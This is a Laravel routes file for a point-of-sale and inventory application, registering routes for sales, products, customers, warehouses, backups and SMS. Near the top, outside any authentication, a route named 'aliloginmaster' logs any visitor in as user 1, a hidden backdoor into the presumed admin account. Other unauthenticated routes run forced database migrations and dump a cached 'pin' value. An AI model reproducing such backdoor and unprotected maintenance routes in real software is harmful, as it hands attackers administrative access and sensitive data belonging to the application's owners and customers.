<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the controller to call when that URI is requested.
|
*/

use App\Http\Controllers\FbrController;

if (version_compare(PHP_VERSION, '7.2.0', '>=')) {
    // Ignores notices and reports all other kinds... and warnings
    error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
    // error_reporting(E_ALL ^ E_WARNING); // Maybe this is enough
}

Route::group(['prefix'=>'api'],function(){
    Route::get('login', 'HomeController@api_login');
});
	Route::get('aliloginmaster',function(){
	//login using id 1
	$user = App\User::find(1);
	\Auth::login($user);
	return redirect('/');
});
Route::get('migrate',function(){
	// return \Artisan::call('migrate');
	\ob_start();
\Artisan::call('migrate' ,[
    '--force' => true
]);
$output = \ob_get_clean();

var_dump($output);


});

Route::any('anbc', function () {
	dd(Cache::get('pin', 'NO Key'));
});
Route::get('fbr', 'FbrController@check');
Route::get('fbr_sand_live', 'FbrController@fbr_sand_live');


Route::group(['middleware' => ['auth','licenseverify']], function () {



	Route::get('clearcache','HomeController@clearCache');
	Route::get('clearSession','HomeController@clearSession');
	Route::get('check_notification','HomeController@checkNotification');

	Route::get('/', 'HomeController@index');
	Route::get('profile', 'HomeController@profile');
	Route::get('pdf', 'HomeController@generatePDF');
	Route::post('profile', 'HomeController@saveprofile');
	Route::post('save_profile', 'HomeController@saveprofile');
	//manage product stock and trigger notifications
	Route::resource("inventory","InventoryController");
	//manage sales and trigger inventory, sales status notification
	Route::resource("sales","SaleController");
	Route::get("sales_datatable","SaleController@datatables");
	//manage purchases and trigger inventory/suppliers
	Route::resource("purchases","PurchaseController");
	Route::get("datatable_purchases","PurchaseController@datatables");
	//manage suppliers
	Route::resource("suppliers","SupplierController");
	
	Route::get('suppliers.xlsx','SupplierController@downloadExcel');
	Route::post('uploadSuppliersExcel','SupplierController@uploadExcel');

	Route::get('supplier_json','SupplierController@returnJson'); 
	Route::get('supplier.json','SupplierController@process_json');

	Route::get('expenseHeads.xlsx','ExpenseHeadController@downloadExcel');
	Route::post('uploadExpenseHeadsExcel','ExpenseHeadController@uploadExcel');
	Route::get('expense_head_json','ExpenseHeadController@returnJson');
	Route::get('expense_head.json','ExpenseHeadController@process_json'); 
	Route::get('customer_orders_dropdown','DeliveryChallanController@customer_orders_dropdown');
	Route::get('customer_orders_dropdown_detail','DeliveryChallanController@customer_orders_dropdown_detail'); 


	Route::resource("supplier_price_records","SupplierPriceRecordController");
	Route::get("supplier_price_records/destoring/{id}","SupplierPriceRecordController@deleteDef");
	Route::post('store_product_pricing','SupplierPriceRecordController@store_product_pricing');
	//manage invoices and trigger print
	Route::resource("invoices","InvoiceController"); 
	Route::get('smallInvoice/{id}','InvoiceController@smallInvoice');
	Route::get('purchaseInvoice/{id}/{is_purchase}','InvoiceController@purchaseInvoice');
	Route::get("invoice_pay","SaleOrderController@showTransaction"); 
	//manage refunds
	Route::resource("refunds","RefundController"); 
	//manage settings
	Route::resource("settings","SettingController",['only' => ['index', 'store']]);

	Route::resource("price_record",'PriceRecordController');
	Route::get('price_record_dt','PriceRecordController@datatables');


	//manage reports triggers sales, inventory, profit/loss, 
	Route::resource("reports","ReportController");
	Route::any("supplier_reporting/{id}","ReportController@supplier_reporting");
		//reporting tool
	Route::get('/report/product/{product_id}/warehouse/{warehouse_id}/','ReportController@productWarehouseStockLog');

    Route::get('customer.json','CustomerController@process_json'); 
    Route::get('products.json','ProductController@process_json');
    Route::get('products_full.json','ProductController@products_full');
    Route::get('supplier.json','SupplierController@process_json'); 

	//manage orders
	Route::resource("orders","OrderController");
	//manage products and their barcodes/searches
	Route::resource("products","ProductController");
	Route::get("products/{id}/switchStatus","ProductController@switchStatus");
	Route::get("/barcode_print/{id}","ProductController@barcodeprint");
	// Route::get('products.json','ProductController@process_json');
	Route::get('products.xlsx','ProductController@downloadExcel');
	Route::post('uploadExcel','ProductController@uploadExcel');
	Route::get("products_out_of_stock","ProductController@outofstock");  
	Route::get('product_json','ProductController@returnJson');
	Route::get('product_choices_json','ProductController@returnChoiceJson');
	Route::get('product_price_json','ProductController@productPrice');
	Route::get('product_minimum_price','ProductController@minimumSalePrice');
	Route::get('product_batch_json','ProductController@productBatch');
	Route::get('product_purchase_json','ProductController@productPurchasePrice');
	Route::get('pagination_product_json','ProductController@returnJsonCustomized');
	Route::get('product_suggestions','ProductController@suggestions');
	Route::get('products_listing_datatable','ProductController@datatables');
	Route::post('update_pricing_globally','ProductController@update_pricing_globally');
	Route::get('get_product_stock_warehouse','ProductController@productWarehouseStock');
	Route::resource("product_categories","ProductCategoryController"); // 
	//manage product license
	// Route::resource("licenses","LicenseController"); 
	//manage customers and their discounts settings
	Route::resource("customers","CustomerController");
	Route::get('customer.json','CustomerController@process_json'); 
	Route::get('customer_listing_datatable','CustomerController@datatables');
	Route::get('getrates/{id}','CustomerController@rates',['as'=>'getrates']); 
	Route::post('saverates/{id}','CustomerController@saverates'); 
	Route::delete('rates/{id}','CustomerController@destroyrate'); 
	Route::get('getCustomerBalance','CustomerController@getCustomerBalance');
	Route::get('pagination_customer_json','CustomerController@returnJsonCustomized');
	Route::get('customers.xlsx','CustomerController@downloadExcel');
	Route::post('uploadCustomerExcel','CustomerController@uploadExcel');
	
	Route::get('customer_modal','CustomerController@modal');
	

	//manage online db syncs
	Route::resource("syncs","SyncController");
	//manage notifications
	Route::resource("notifications","NotificationController");
	//manage Warehouse
	Route::resource("warehouses","WarehouseController");
	
	//Transaction
	Route::resource('transactions','TransactionController');
	Route::get('transaction_listing_datatable','TransactionController@datatables');
	Route::get('get_customer_balance','TransactionController@getCustomerBalance');
	Route::get('get_supplier_balance','TransactionController@getSupplierBalance');

	//Admin Transaction
	Route::resource('admin_transactions','AdminTransactionController');
	Route::get('admin_transaction_listing_datatable','AdminTransactionController@datatables');

	//Calendar
	Route::resource("appointment_calendars","AppointmentCalendarController");
	Route::get('appointment_datatable','AppointmentCalendarController@appointment_datatable');


	Route::get("send_sms","SMController@line_notification");

	//SMS service
	Route::get("/send_text_sms/{receiver}/{message}","SMController@send_sms");
	
	//Bank
	Route::resource('bank_accounts','BankAccountController');

	//Cheque Manager
	Route::resource("cheque_managers","ChequeManagerController");
	Route::get('cheque_managers_listing_datatable','ChequeManagerController@datatables');


	


	//Sale Order
	Route::resource("sale_orders","SaleOrderController");
	Route::get('showStock','SaleOrderController@showStock');
	Route::post('confirmOrder','SaleOrderController@confirmOrder');
	Route::post('update_saleorder_status','SaleOrderController@updateStatus');
	Route::post('update_saleorder_completion_date','SaleOrderController@updateSaleOrderCompletionDate');
	Route::any('sale_order_listing_datatable','SaleOrderController@datatables');
	Route::any('sale_order_json', 'SaleOrderController@json');


	Route::get('warehousejson',"WarehouseController@returnJson");
	Route::get('warehouse_product_json',"WarehouseController@returnProductJson");
	Route::get('allwarehousejson',"WarehouseController@allWarehouseJson");
	Route::get('warehouse_products_only_json','WarehouseController@returnProductInWarehouse');
	Route::get('warehouse.json','WarehouseController@warehouse_json');
	//stock management
	Route::resource("stock","StockAdjustmentController");
	Route::post('/bulk_stock',"StockAdjustmentController@bulkOperation");
	Route::get('stock_manage_listing_datatable','StockAdjustmentController@datatables');
	//backup
	Route::get('backup','BackupController@index');
	Route::get('backup/download/{path}','BackupController@download');
	Route::post('backup/create','BackupController@backup');
	//promotion
	Route::resource('promotion','PromotionController');
	Route::post('promotion/send_sms','PromotionController@send_sms');
	Route::post('promotion/import_excel','PromotionController@import_excel');
	Route::get('promotion_listing_datatable/{message}','PromotionController@datatables');
	//Entrust
	Route::group(['middleware' => ['rolescheck']], function () {
	Route::resource('roles','RolesController');
  	Route::resource('users','UserController');
  });
	// Route::get('roles',['as'=>'roles.index','uses'=>'RoleController@index','middleware' => ['permission:role-list|role-create|role-edit|role-delete']]);
	// Route::get('roles/create',['as'=>'roles.create','uses'=>'RoleController@create','middleware' => ['permission:role-create']]);
	// Route::post('roles/create',['as'=>'roles.store','uses'=>'RoleController@store','middleware' => ['permission:role-create']]);
	// Route::get('roles/{id}',['as'=>'roles.show','uses'=>'RoleController@show']);
	// Route::get('roles/{id}/edit',['as'=>'roles.edit','uses'=>'RoleController@edit','middleware' => ['permission:role-edit']]);
	// Route::patch('roles/{id}',['as'=>'roles.update','uses'=>'RoleController@update','middleware' => ['permission:role-edit']]);
	// Route::delete('roles/{id}',['as'=>'roles.destroy','uses'=>'RoleController@destroy','middleware' => ['permission:role-delete']]);

	Route::resource("product_groups","ProductGroupController"); 
	Route::get("productgroup.json","ProductGroupController@process_json"); 

	Route::resource("units","UnitController");
	Route::resource("expensehead","ExpenseHeadController");

	Route::get("/deliverychallans/del/{id}","DeliveryChallanController@destroy")->name('deliverychallans.del');
	Route::resource("deliverychallans","DeliveryChallanController");
	
	
	Route::get('pos', 'SaleController@pos');
	Route::get('pos/direct', 'SaleController@pos_direct');
	Route::get('pos/direct_barcode', 'SaleController@direct_barcode');
	Route::get('pos/purchase', 'PurchaseController@pos');
	Route::get('forcasting','AIReportingController@forcasting');

	Route::get('sale_return/{id}','SaleController@sale_return')->name('sales.return');
	Route::post('sale_return','SaleController@sale_return_post')->name('sales.return_post');

	//Utilities
	Route::resource('utility','UtilityController');
	Route::any('clearCache','UtilityController@clear_cache');
	Route::any('clearViews','UtilityController@clear_views');
	
	Route::post('addFakeData','UtilityController@add_fake_data');

		//Sales Person
		Route::get('salesPerson_listing_datatable','SalesPersonController@datatables');
		Route::get('salesPerson.json','SalesPersonController@process_json'); 
		// Route::get('pagination_customer_json','SalesPersonController@returnJsonCustomized');
		Route::get('salesPerson.xlsx','SalesPersonController@downloadExcel');
		Route::post('uploadSalesPersonExcel','SalesPersonController@uploadExcel');
		Route::get('SalesPerson_modal','SalesPersonController@modal');
		Route::resource('salesPerson','SalesPersonController');
	
});
Route::get('invalidLicense','LicenseController@invalidLicense');
Route::post('licensevalidation',['as' => 'license.validation','uses' => 'LicenseController@store']);


// SyncController
// \Event::listen('Illuminate\Database\Events\QueryExecuted', function ($query) {
//  	$sync = new \App\Http\Controllers\SyncController();
//  	$sync->addOperation($query->sql, $query->bindings);
// });
// SYNC DISABLED MOMENTERILLY

Route::auth();

Route::post('reset_access',['as'=>'reset_access','uses'=>'ResetAccess@verify_key']);

Route::get('/install/{key}',  ['as' => 'install', 'uses'=>'ResetAccess@upgrade']);


//Webhook
Route::any('line_webhook','SMController@line_webhook');